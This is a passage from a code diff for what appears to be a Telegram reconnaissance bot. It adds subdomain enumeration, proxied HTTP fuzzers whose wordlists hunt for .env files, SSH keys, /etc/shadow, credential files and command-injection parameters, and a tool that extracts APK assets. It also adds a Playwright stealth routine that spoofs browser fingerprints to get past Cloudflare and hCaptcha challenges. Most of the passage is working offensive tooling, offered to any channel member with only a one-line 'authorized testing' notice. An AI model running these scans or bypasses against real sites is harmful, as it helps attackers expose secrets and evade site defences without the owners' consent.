+    finally:
+        prog.cancel()
+
+    total    = data["total_unique"]
+    resolved = data["resolved"]
+    crtsh_c  = len(data["crtsh"])
+    ht_c     = len(data["hackertarget"])
+    bf_c     = len(data["bruteforce"])
+    wc       = data["wildcard_detected"]
+
+    lines = [
+        f"📡 *Subdomain Enumeration — `{escape_md(raw)}`*",
+        f"━━━━━━━━━━━━━━━━━━━━",
+        f"🔎 Total unique: `{escape_md(total)}`",
+        f"  crt.sh:       `{escape_md(crtsh_c)}`",
+        f"  HackerTarget: `{escape_md(ht_c)}`",
+        f"  Brute-force:  `{escape_md(bf_c)}` live",
+        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
+    ]
+
+    # Show top results
+    if data["all_unique"]:
+        lines.append("*Found Subdomains:*")
+        for h in data["all_unique"][:30]:
+            ip = resolved.get(h, "?")
+            # Flag interesting ones
+            flag = ""
+            for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
+                if keyword in h:
+                    flag = " 🔴"
+                    break
+            lines.append(f"  `{escape_md(h)}` → `{escape_md(ip)}`{flag}")
+        if total > 30:
+            lines.append(f"  _…and {total-30} more in export file_")
+
+    lines.append("\n📦 _Full list exported below_")
+
+    await safe_markdown_reply(msg, _truncate_safe_md("\n".join(lines)))
+
+    # ── Export files ──────────────────────────────────
+    import io
+    txt_content  = "\n".join(
+        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
+    )
+    json_content = json.dumps({
+        "domain": raw, "scanned_at": datetime.now().isoformat(),
+        "total_unique": total, "wildcard_detected": wc,
+        "sources": {"crtsh": crtsh_c, "hackertarget": ht_c, "bruteforce": bf_c},
+        "subdomains": [{
+            "hostname": h, "ip": resolved.get(h,"?"),
+            "interesting": any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))
+        } for h in data["all_unique"]],
+    }, indent=2)
+
+    import zipfile as _zf2
+    zip_buf = io.BytesIO()
+    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_d  = re.sub(r'[^\w\-]', '_', raw)
+    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
+        zf.writestr("subdomains.txt",  txt_content.encode())
+        zf.writestr("subdomains.json", json_content.encode())
+        interesting = [h for h in data["all_unique"]
+                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))]
+        zf.writestr("interesting.txt", "\n".join(interesting).encode())
+    zip_buf.seek(0)
+
+    await context.bot.send_document(
+        chat_id=update.effective_chat.id,
+        document=zip_buf,
+        filename=f"subdomains_{safe_d}_{ts}.zip",
+        caption=(
+            f"📡 *Subdomains — `{escape_md(raw)}`*\n"
+            f"Total: `{escape_md(total)}` | Interesting: `{len(interesting)}`\n"
+            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
+        ),
+        parse_mode='Markdown'
+    )
+
+
+# ══════════════════════════════════════════════════
+# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
+# ══════════════════════════════════════════════════
+
+_FUZZ_PATHS = [
+    # Hidden admin / debug
+    "admin","administrator","admin.php","admin/login","login","login.php",
+    "dashboard","panel","control","manage","manager","cpanel","wp-admin",
+    "debug","test","testing","dev","development","staging","beta","old",
+    # Backup files
+    "backup","backup.zip","backup.sql","dump.sql","db.sql","site.zip",
+    "index.php.bak","index.html.bak","config.php.bak",".env",".env.bak",
+    ".env.example",".env.local",".env.production",
+    # Info disclosure
+    "info.php","phpinfo.php","server-info","server-status","status",
+    "health","ping","version","api/version","build","trace",
+    # Source leaks
+    ".git","git/config",".svn","web.config",".htaccess","crossdomain.xml",
+    "robots.txt","sitemap.xml","humans.txt","security.txt",
+    ".well-known/security.txt","readme.md","README.md","CHANGELOG.md",
+    # CMS paths
+    "wp-login.php","wp-config.php","xmlrpc.php","wp-json",
+    "joomla","wp-content/debug.log","config/database.yml",
+    "configuration.php","config.php","config.yml","config.json",
+    "settings.py","database.yml","credentials.json","secrets.json",
+    # API
+    "api","api/v1","api/v2","api/v3","api/users","api/admin","graphql",
+    "swagger.json","openapi.json","api-docs","redoc","swagger-ui.html",
+    # Logs
+    "error.log","access.log","debug.log","app.log","laravel.log",
+    "storage/logs/laravel.log","logs/error.log","var/log/app.log",
+    # Common uploads/files
+    "uploads","files","static","assets","media","public",
+    "download","downloads","export","exports","report","reports",
+    # Framework specific
+    "actuator","actuator/health","actuator/env","actuator/mappings",
+    "metrics","prometheus","grafana","kibana","phpmyadmin","adminer.php",
+    # Common hidden files
+    "id_rsa","id_rsa.pub","authorized_keys","known_hosts",
+    "passwd","shadow","hosts","resolv.conf",
+]
+
+_FUZZ_PARAMS = [
+    "id","user","username","email","file","path","page","url","redirect",
+    "next","return","callback","debug","test","admin","token","key","secret",
+    "cmd","exec","command","query","search","q","type","action","method",
+    "format","output","lang","language","locale","theme","template","view",
+    "include","require","load","src","source","data","payload","input",
+    "name","pass","password","hash","sig","signature","auth","session",
+    "api_key","access_token","refresh_token","client_id","client_secret",
+]
+
+def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
+    """Improved fuzzer — tech-aware + backup ext + param + response diff."""
+    found = []
+
+    # Baseline fingerprint
+    try:
+        r404 = requests.get(
+            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
+            timeout=6, verify=False, headers=_get_headers(),
+            proxies=proxy_manager.get_proxy()
+        )
+        baseline_status = r404.status_code
+        baseline_size   = len(r404.content)
+        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
+        baseline_words  = len(r404.text.split()) if r404.text else 0
+    except Exception:
+        baseline_status, baseline_size, baseline_hash, baseline_words = 404, 0, "", 0
+
+    def _is_interesting(r_status, r_size, r_hash, r_words):
+        if r_status == baseline_status:
+            if r_hash and r_hash == baseline_hash:
+                return False
+            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
+                return False
+            if baseline_words > 0 and abs(r_words - baseline_words) < 5:
+                return False
+        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)
+
+    def _probe(target_url):
+        try:
+            r = requests.get(
+                target_url, timeout=5, verify=False,
+                headers=_get_headers(), allow_redirects=True,
+                stream=True, proxies=proxy_manager.get_proxy()
+            )
+            chunk = b""
+            for part in r.iter_content(2048):
+                chunk += part
+                if len(chunk) >= 2048:
+                    break
+            r.close()
+            r_size  = int(r.headers.get("Content-Length", len(chunk)))
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_ct    = r.headers.get("Content-Type", "")[:40]
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
+            if _is_interesting(r.status_code, r_size, r_hash, r_words):
+                gated = r.status_code in (401, 403)
+                return {
+                    "url":    target_url,
+                    "status": r.status_code,
+                    "size":   r_size,
+                    "ct":     r_ct,
+                    "gated":  gated,
+                    "title":  "",
+                }
+        except Exception:
+            pass
+        return None
+
+    if mode == "params":
+        # Param fuzzing with multiple values
+        targets = []
+        for param, values in _SMART_FUZZ_PARAMS.items():
+            for val in values[:2]:
+                targets.append(f"{base}?{param}={val}")
+        # Also original params
+        for p in _FUZZ_PARAMS:
+            targets.append(f"{base}?{p}=FUZZ")
+    else:
+        base_paths = list(_FUZZ_PATHS)
+        # Tech-aware extras
+        detected = _detect_tech_stack(base)
+        if detected:
+            progress_q.append(f"🔬 Detected: `{'`, `'.join(detected)}`")
+        for tech in detected:
+            base_paths.extend(_TECH_WORDLISTS.get(tech, []))
+
+        # Backup extension permutations (on top 30 paths)
+        backup_targets = []
+        for path in base_paths[:30]:
+            for ext in _BACKUP_EXTENSIONS:
+                backup_targets.append(path.rstrip("/") + ext)
+
+        targets = [f"{base.rstrip('/')}/{p}" for p in base_paths]
+        targets += [f"{base.rstrip('/')}/{p}" for p in backup_targets]
+
+    done = 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
+        fmap = {ex.submit(_probe, t): t for t in targets}
+        for fut in concurrent.futures.as_completed(fmap, timeout=120):
+            done += 1
+            if done % 25 == 0:
+                progress_q.append(
+                    f"🧪 Fuzzing `{done}/{len(targets)}` | Found: `{len(found)}`"
+                )
+            try:
+                res = fut.result(timeout=8)
+                if res:
+                    found.append(res)
+            except Exception:
+                pass
+
+    # Sort: 200 first, then gated (401/403), then rest
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
+    return found, baseline_status
+
+
+_ASSET_CATEGORIES = {
+    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
+    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
+    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
+    "layouts":  {'.xml'},
+    "dex":      {'.dex'},
+    "so_libs":  {'.so'},
+    "fonts":    {'.ttf','.otf','.woff','.woff2'},
+    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
+    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
+    "scripts":  {'.js','.py','.sh','.rb','.php'},
+    "docs":     {'.pdf','.txt','.md','.html','.htm'},
+    "archives": {'.zip','.tar','.gz','.rar','.7z'},
+}
+
+def _categorize_asset(filename: str) -> str:
+    ext = os.path.splitext(filename.lower())[1]
+    for cat, exts in _ASSET_CATEGORIES.items():
+        if ext in exts:
+            return cat
+    return "other"
+
+def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
+    """Extract assets from APK/IPA/ZIP by category."""
+    result = {"files": {}, "stats": {}, "errors": []}
+
+    if not zipfile.is_zipfile(filepath):
+        result["errors"].append("Not a valid ZIP/APK/IPA file")
+        return result
+
+    with zipfile.ZipFile(filepath, 'r') as zf:
+        names = zf.namelist()
+        total = len(names)
+        categorized = {}
+        for name in names:
+            cat = _categorize_asset(name)
+            if cat in wanted_cats:
+                categorized.setdefault(cat, []).append(name)
+
+        result["stats"]["total_files"] = total
+        for cat, files in categorized.items():
+            result["stats"][cat] = len(files)
+
+        # Extract to BytesIO zip
+        import io
+        out_buf = io.BytesIO()
+        extracted = 0
+        MAX_EXTRACT = 200  # max files per export
+        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
+            for cat in wanted_cats:
+                files = categorized.get(cat, [])
+                for i, fname in enumerate(files[:MAX_EXTRACT]):
+                    try:
+                        data = zf.read(fname)
+                        # Flatten long paths
+                        short_name = f"{cat}/{os.path.basename(fname)}"
+                        out_zf.writestr(short_name, data)
+                        extracted += 1
+                        if progress_cb and extracted % 20 == 0:
+                            progress_cb(f"📦 Extracting... `{escape_md(extracted)}` files")
+                    except Exception as e:
+                        result["errors"].append(f"{fname}: {e}")
+
+        result["extracted"] = extracted
+        result["zip_buffer"] = out_buf
+    return result
+
+
+async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
+    uid = update.effective_user.id
+
+    # Force join check
+    if not await check_force_join(update, context):
+        return
+
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    # Check if user has a recently uploaded file
+    async with db_lock:
+        db = _load_db_sync()
+    u = get_user(db, uid)
+    last_app = u.get("last_uploaded_app")
+
+    if not last_app or not os.path.exists(last_app):
+        await update.effective_message.reply_text(
+            "📦 *APK Asset Extractor*\n\n"
+            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
+            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
+            "Extract လုပ်နိုင်သော Category များ:\n"
+            "🖼 `images` — PNG, JPG, SVG, WebP\n"
+            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
+            "🎬 `video` — MP4, WebM, MKV\n"
+            "📐 `layouts` — XML Layout files\n"
+            "⚙️ `dex` — classes.dex (bytecode)\n"
+            "🔧 `so_libs` — .so Native libraries\n"
+            "🔤 `fonts` — TTF, OTF, WOFF\n"
+            "🔒 `certs` — PEM, CER, Keystores\n"
+            "📋 `configs` — JSON, YAML, Properties\n"
+            "📝 `scripts` — JS, Python, Shell\n"
+            "📄 `docs` — PDF, TXT, HTML\n"
+            "🗜 `archives` — ZIP, TAR, GZ",
+            parse_mode='Markdown'
+        )
+        return
+
+    # Parse category args
+    valid_cats = set(_ASSET_CATEGORIES.keys())
+    wanted_cats = set()
+    if context.args:
+        for a in context.args:
+            a = a.lower().strip()
+            if a == "all":
+                wanted_cats = valid_cats.copy()
+                break
+            if a in valid_cats:
+                wanted_cats.add(a)
+
+    if not wanted_cats:
+        # Build selection keyboard
+        rows = []
+        cats_list = list(valid_cats)
+        for i in range(0, len(cats_list), 3):
+            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
+            rows.append(row)
+        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
+        await update.effective_message.reply_text(
+            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
+            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
+            reply_markup=InlineKeyboardMarkup(rows),
+            parse_mode='Markdown'
+        )
+        return
+
+    await _do_appassets_extract(update, context, last_app, wanted_cats)
+
+
+async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_cats: set):
+    import io
+    # Support both Update objects and raw Message objects
+    if hasattr(update_or_msg, 'effective_message'):
+        target_msg  = update_or_msg.effective_message
+        chat_id     = update_or_msg.effective_chat.id
+    else:
+        # Raw Message (from callback)
+        target_msg  = update_or_msg
+        chat_id     = update_or_msg.chat_id
+
+    fname = os.path.basename(filepath)
+    msg = await target_msg.reply_text(
+        f"📦 *Asset Extractor — `{escape_md(fname)}`*\n\n"
+        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
+        "⏳ Extracting...",
+        parse_mode='Markdown'
+    )
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try:
+                    await msg.edit_text(
+                        f"📦 *Extracting `{escape_md(fname)}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception:
+                    pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        result = await run_scan(
+            uid, _extract_apk_assets_sync, filepath, wanted_cats,
+            lambda t: progress_q.append(t)
+        )
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped\n`/stop` ဖြင့် ရပ်လိုက်သည်", parse_mode='Markdown')
+        return
+    except Exception as e:
+        prog.cancel()
+        await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
+        return
+    finally:
+        prog.cancel()
+
+    if result.get("errors") and result.get("extracted", 0) == 0:
+        _err_txt = '\n'.join(result['errors'][:3])
+        await msg.edit_text(f"❌ `{escape_md(_err_txt)}`", parse_mode='Markdown')
+        return
+
+    stats = result["stats"]
+    extracted = result.get("extracted", 0)
+    zip_buf: io.BytesIO = result.get("zip_buffer")
+
+    if extracted == 0:
+        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
+        await msg.edit_text(
+            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
+            parse_mode='Markdown'
+        )
+        return
+
+    stat_lines = "\n".join(
+        f"  {cat}: `{escape_md(stats.get(cat, 0))}`" for cat in sorted(wanted_cats)
+    )
+    zip_buf.seek(0)
+    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024
+
+    await msg.edit_text(
+        f"✅ *Extraction ပြီးပါပြီ*\n\n"
+        f"📦 Extracted: `{escape_md(extracted)}` files\n"
+        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
+        f"*Per Category:*\n{stat_lines}\n\n"
+        "📤 ZIP upload နေပါသည်...",
+        parse_mode='Markdown'
+    )
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
+    zip_name = f"assets_{safe_fname}_{ts}.zip"
+
+    try:
+        await context.bot.send_document(
+            chat_id=chat_id,
+            document=zip_buf,
+            filename=zip_name,
+            caption=(
+                f"📦 *APK Assets — `{escape_md(os.path.basename(filepath))}`*\n"
+                f"📂 `{escape_md(extracted)}` files extracted\n"
+                f"💾 `{zip_size_mb:.2f}` MB\n"
+                f"Categories: `{', '.join(sorted(wanted_cats))}`"
+            ),
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        await target_msg.reply_text(f"❌ Upload error: `{escape_md(e)}`", parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
+# ══════════════════════════════════════════════════
+
+async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/antibot <url> — Cloudflare/hCaptcha bypass via Playwright Stealth"""
+    if not await check_force_join(update, context):
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/antibot https://example.com`\n\n"
+            "🤖 *Bypass Methods:*\n"
+            "  ① Human-like mouse movement + delay simulation\n"
+            "  ② Random viewport + timezone spoofing\n"
+            "  ③ Canvas/WebGL fingerprint randomization\n"
+            "  ④ Stealth Playwright (navigator.webdriver=false)\n"
+            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
+            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
+            "⚙️ *Requirements:*\n"
+            "  `pip install playwright && playwright install chromium`\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    if not PLAYWRIGHT_OK:
+        await update.effective_message.reply_text(
+            "❌ *Playwright မရှိသေးပါ*\n\n"
+            "Setup:\n"
+            "```\npip install playwright\nplaywright install chromium\n```",
+            parse_mode='Markdown'
+        )
+        return
+
+    domain = urlparse(url).netloc
+    msg = await update.effective_message.reply_text(
+        f"🤖 *Anti-Bot Bypass — `{escape_md(domain)}`*\n\n"
+        "① Stealth mode on\n"
+        "② Human-like behavior injecting...\n"
+        "③ Waiting for challenge...\n⏳",
+        parse_mode='Markdown'
+    )
+
+    def _run_antibot():
+        """Playwright stealth — navigator.webdriver hidden, human-like timing"""
+        if not PLAYWRIGHT_OK:
+            return {"success": False, "error": "Playwright not available"}
+        try:
+            from playwright.sync_api import sync_playwright
+            with sync_playwright() as pw:
+                browser = pw.chromium.launch(
+                    headless=True,
+                    args=["--no-sandbox", "--disable-dev-shm-usage",
+                          "--disable-blink-features=AutomationControlled", "--disable-gpu"]
+                )
+                ctx = browser.new_context(
+                    user_agent=(
+                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                        "AppleWebKit/537.36 (KHTML, like Gecko) "
+                        "Chrome/122.0.0.0 Safari/537.36"
+                    ),
+                    viewport={"width": 1366, "height": 768},
+                    locale="en-US",
+                    timezone_id="America/New_York",
+                    ignore_https_errors=True,
+                )
+                ctx.add_init_script("""
+                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                    window.chrome = {runtime: {}};
+                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
+                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
+                    const orig = HTMLCanvasElement.prototype.toDataURL;
+                    HTMLCanvasElement.prototype.toDataURL = function(...args) {
+                        const ctx2 = this.getContext('2d');
+                        if (ctx2) {
+                            const d = ctx2.getImageData(0,0,1,1);
+                            d.data[0] = Math.floor(Math.random()*10);
+                            ctx2.putImageData(d,0,0);
+                        }
+                        return orig.apply(this, args);
+                    };
+                """)
+                page = ctx.new_page()
+                # Human-like mouse movement
+                page.mouse.move(300 + int(200 * 0.5), 200 + int(100 * 0.5))
+                try:
+                    page.goto(url, wait_until="networkidle", timeout=60_000)
+                except Exception:
+                    try:
+                        page.goto(url, wait_until="load", timeout=40_000)
+                    except Exception:
+                        pass
+                page.wait_for_timeout(2500)
+                html = page.content()
+                browser.close()
+                if html and html.strip():
+                    return {"success": True, "html": html, "method": "stealth_playwright"}
+                return {"success": False, "error": "Empty response"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    try:
+        res = await run_scan(uid, _run_antibot)
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
+        return
+
+    if not res["success"]:
+        await msg.edit_text(
+            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
+            f"Error: `{res['error']}`\n\n"
+            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
+            parse_mode='Markdown'
+        )
+        return
+
+    html = res["html"]
+    method = res.get("method", "unknown")
+    html_size_kb = len(html.encode()) / 1024
+
+    # Save and send as file
+    import io
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_d = re.sub(r'[^\w\-]', '_', domain)
+    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))
+
+    await msg.edit_text(
+        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
+        f"🌐 `{escape_md(domain)}`\n"
+        f"⚙️ Method: `{escape_md(method)}`\n"
+        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
+        "📤 HTML file upload နေပါသည်...",
+        parse_mode='Markdown'
+    )
+
+    try:
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=html_buf,
+            filename=f"antibot_{safe_d}_{ts}.html",
+            caption=(
+                f"🤖 *Anti-Bot Bypass — `{escape_md(domain)}`*\n"
+                f"Method: `{escape_md(method)}`\n"
+                f"Size: `{html_size_kb:.1f}` KB"
+            ),
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        await update.effective_message.reply_text(f"❌ Upload: `{escape_md(e)}`", parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
+#     CeWL-style wordlist generator + fuzzer
+# ══════════════════════════════════════════════════
+
+_SMARTFUZZ_STOP_WORDS = {
+    'the','a','an','in','on','at','for','of','to','is','are','was','were',
+    'and','or','but','if','with','this','that','from','by','not','it',
+    'be','as','we','you','he','she','they','have','has','had','do','does',
+    'did','will','would','could','should','may','might','can','our','your',
+    'their','its','which','who','what','how','when','where','why',
+}
+
+def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
+    """
+    CeWL-style: scrape target, extract unique words → generate permutations.
+    Returns (wordlist: list, raw_words: list)
+    """
+    parsed = urlparse(url)
+    root   = f"{parsed.scheme}://{parsed.netloc}"
+    domain_parts = parsed.netloc.replace('www.', '').split('.')
+
+    all_words = set()
+
+    # ── Scrape homepage + up to 3 internal pages ──
+    try:
+        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, proxies=proxy_manager.get_proxy())
+        soup = BeautifulSoup(r.text, 'html.parser')
+        if progress_cb:
+            progress_cb("🌐 Homepage scraped")
+
+        # Extract text words
+        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
+            text = tag.get_text(separator=' ')
+            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
+                all_words.add(w.lower())
+
+        # Extract from meta tags
+        for meta in soup.find_all('meta'):
+            content = meta.get('content', '') + ' ' + meta.get('name', '')
+            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
+                all_words.add(w.lower())
+
+        # Extract from JS variables / identifiers
+        for script in soup.find_all('script'):
+            src_text = script.string or ''
+            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
+                all_words.add(w.lower())
+
+        # Extract from class names and IDs
+        for tag in soup.find_all(True):
+            for attr in ('class', 'id', 'name'):
+                vals = tag.get(attr, [])
+                if isinstance(vals, str):
+                    vals = [vals]
+                for v in vals:
+                    for w in re.split(r'[-_\s]', v):
+                        if 3 <= len(w) <= 20:
+                            all_words.add(w.lower())
+
+        # Crawl 3 more internal pages
+        links = list(get_internal_links(r.text, url))[:3]
+        for link in links:
+            try:
+                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False, proxies=proxy_manager.get_proxy())
+                soup2 = BeautifulSoup(r2.text, 'html.parser')
+                for tag in soup2.find_all(['h1','h2','h3','title','p']):
+                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
+                        all_words.add(w.lower())
+            except Exception:
+                pass
+
+    except Exception as e:
+        if progress_cb:
+            progress_cb(f"⚠️ Scrape error: {e}")
+
+    # Add domain parts
+    for part in domain_parts:
+        all_words.add(part.lower())
+
+    # Filter stop words + numeric-only
+    raw_words = sorted(
+        w for w in all_words
+        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
+    )
+
+    if progress_cb:
+        progress_cb(f"📝 Raw words: `{len(raw_words)}`")
+
+    # ── Generate permutations ──────────────────────
+    current_year = datetime.now().year
+    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
+    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
+                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
+                     '.zip', '.sql', '.tar.gz', '.env', '.json']
+    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
+                     '.', '_']
+
+    wordlist = set()
+
+    # Base words
+    for w in raw_words[:80]:   # top 80 words
+        wordlist.add(w)
+        wordlist.add(w + '.php')
+        wordlist.add(w + '.html')
+        wordlist.add(w + '.txt')
+        # Year combos
+        for yr in years[:3]:
+            wordlist.add(f"{w}_{yr}")
+            wordlist.add(f"{w}_{yr}.zip")
+            wordlist.add(f"{w}_{yr}.sql")
+        # Suffix combos
+        for suf in suffixes[:8]:
+            wordlist.add(w + suf)
+        # Prefix combos
+        for pfx in prefixes[:5]:
+            if pfx:
+                wordlist.add(pfx + w)
+
+    # Domain-specific combos
+    for part in domain_parts[:3]:
+        for yr in years:
+            wordlist.add(f"{part}_{yr}")
+            wordlist.add(f"{part}_{yr}.zip")
+            wordlist.add(f"{part}_backup_{yr}")
+            wordlist.add(f"backup_{part}")
+            wordlist.add(f"{part}_db.sql")
+            wordlist.add(f"{part}.sql")
+
+    final_wordlist = sorted(wordlist)
+    if progress_cb:
+        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")
+
+    return final_wordlist, raw_words
+
+
+def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
+    """Probe wordlist + backup ext variants + response diff."""
+    found = []
+
+    try:
+        r404 = requests.get(
+            base_url.rstrip("/") + "/xyznotfound_abc123_never_exists",
+            proxies=proxy_manager.get_proxy(),
+            timeout=6, verify=False, headers=_get_headers()
+        )
+        baseline_status = r404.status_code
+        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
+        baseline_size   = len(r404.content)
+        baseline_words  = len(r404.text.split()) if r404.text else 0
+    except Exception:
+        baseline_status, baseline_hash, baseline_size, baseline_words = 404, "", 0, 0
+
+    # Expand wordlist with backup extensions
+    expanded = list(wordlist)
+    for word in wordlist[:50]:
+        for ext in [".bak", ".old", ".swp", "~", ".orig"]:
+            expanded.append(word.rstrip("/") + ext)
+
+    def _probe(word):
+        target = base_url.rstrip("/") + "/" + word.lstrip("/")
+        try:
+            r = requests.get(
+                target, timeout=5, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy(),
+                allow_redirects=True, stream=True
+            )
+            chunk = b""
+            for part in r.iter_content(1024):
+                chunk += part
+                if len(chunk) >= 1024:
+                    break
+            r.close()
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_size  = len(chunk)
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
+            if r.status_code == baseline_status:
+                if r_hash == baseline_hash:
+                    return None
+                if baseline_size > 0 and abs(r_size - baseline_size) < 30:
+                    return None
+                if baseline_words > 0 and abs(r_words - baseline_words) < 5:
+                    return None
+
+            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
+                return {
+                    "url":    target,
+                    "word":   word,
+                    "status": r.status_code,
+                    "size":   r_size,
+                    "gated":  r.status_code in (401, 403),
+                }
+        except Exception:
+            pass
+        return None
+
+    done = 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
+        fmap = {ex.submit(_probe, w): w for w in expanded}
+        for fut in concurrent.futures.as_completed(fmap, timeout=150):
+            done += 1
+            if progress_cb and done % 40 == 0:
+                progress_cb(
+                    f"🧪 Fuzzing: `{done}/{len(expanded)}` | "
+                    f"Found: `{len(found)}` (incl. gated)"
+                )
+            try:
+                res = fut.result(timeout=6)
+                if res:
+                    found.append(res)
+            except Exception:
+                pass
+
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
+    return found
+
+
+# ───────────────────────────────────────────────────────────────────
+# [4] REPLACE _endpoints_sync (original: line ~8865)
+#     IMPROVEMENTS:
+#       + Fetch /swagger.json /openapi.yaml /api-docs /redoc
+#       + GraphQL introspection query (types list)
+#       + Parse Next.js _buildManifest.js for route list
+#       + gRPC-web content-type detection
+#       + Group /v1 /v2 /v3 side-by-side in results
